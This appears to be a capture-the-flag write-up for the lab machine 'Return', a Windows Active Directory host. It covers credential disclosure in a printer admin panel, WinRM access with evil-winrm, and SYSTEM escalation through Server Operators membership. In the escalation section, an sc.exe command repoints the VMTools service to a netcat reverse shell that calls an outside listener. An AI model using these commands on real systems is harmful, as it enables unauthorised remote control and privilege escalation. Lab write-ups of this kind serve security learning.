# Return

**Difficulty:** Easy | **OS:** Windows | **IP:** `10.129.95.241`

## Summary
**Return** is an easy-difficulty Windows Active Directory machine that illustrates risks associated with administrative panel credential exposure, Active Directory group membership privileges, and insecure service configurations. Initial access is achieved by accessing a printer management web interface on port 80, uncovering cleartext service account credentials stored within settings configurations, and using them to authenticate via WinRM. Privilege escalation to `NT AUTHORITY\SYSTEM` is performed by exploiting membership in the Server Operators group, which permits modifying an existing Windows service binary path (`VMTools`) and restarting the service to execute a reverse shell with administrative privileges.

## Reconnaissance

### Port Scanning (Nmap)
We begin by enumerating active TCP ports and identifying standard Active Directory service versions:

- **53**	DNS	Simple DNS Plus
- **80**	HTTP	Microsoft IIS httpd 10.0
- **88**	Kerberos	Microsoft Windows Kerberos
- **135**	MSRPC	Microsoft Windows RPC
- **389**	LDAP	Microsoft Windows Active Directory LDAP (return.local)
- **445**	SMB	Microsoft-DS
- **5985**	WinRM	Microsoft HTTPAPI httpd 2.0 (WS-Management

### Web Application & Credential Disclosure
1) Visiting the web service hosted on port 80 reveals an administrative settings panel for a printer utility.
2) Inspecting the printer configuration settings exposes fields where an administrator has configured a remote backup server path along with authentication credentials.
3) The configuration leaks cleartext service credentials:

Username: `svc-printer`
Password: `1edFg43012!!`

## Exploitation (Initial Access)

### WinRM Remote Management
Validating the recovered credentials against network services via Netexec (`nxc`) confirms they grant valid domain user access and remote management rights:

```
nxc winrm 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
```

Using `evil-winrm`, we establish an interactive session on the target host:

```
evil-winrm -i 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
```

We obtain initial user shell access and can retrieve `user.txt`.

## Privilege Escalation (SYSTEM Access)

### Group Membership Enumeration
Checking local user account details via net user `svc-printer` reveals powerful group memberships:

```
Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
```

**Vulnerability Analysis:** Membership in the **Server Operators** group grants users the ability to manage, configure, stop, and start Windows services on the machine, which can be leveraged to achieve code execution under `NT AUTHORITY\SYSTEM`.

### Service Configuration Modification & Exploitation
1) Uploading a netcat utility (`nc.exe`) to the user's home or desktop directory (`C:\Users\svc-printer\Desktop\nc.exe`).
2) Attempting to create a new Windows service fails due to privilege limitations. However, modifying an existing, non-critical service configuration (`VMTools`) is permitted for Server Operators.
3) Reconfiguring the `VMTools` service binary path to execute the netcat reverse shell payload:

```
sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.28 443"
```

4) Stopping and restarting the service triggers execution of the payload under the high-privilege service context:

```
sc.exe stop VMTools
sc.exe start VMTools
```

Catching the incoming connection on an active listener establishes an interactive terminal session under `NT AUTHORITY\SYSTEM`.
Retrieving `root.txt` from `C:\Users\Administrator\Desktop\` completes the machine compromise.
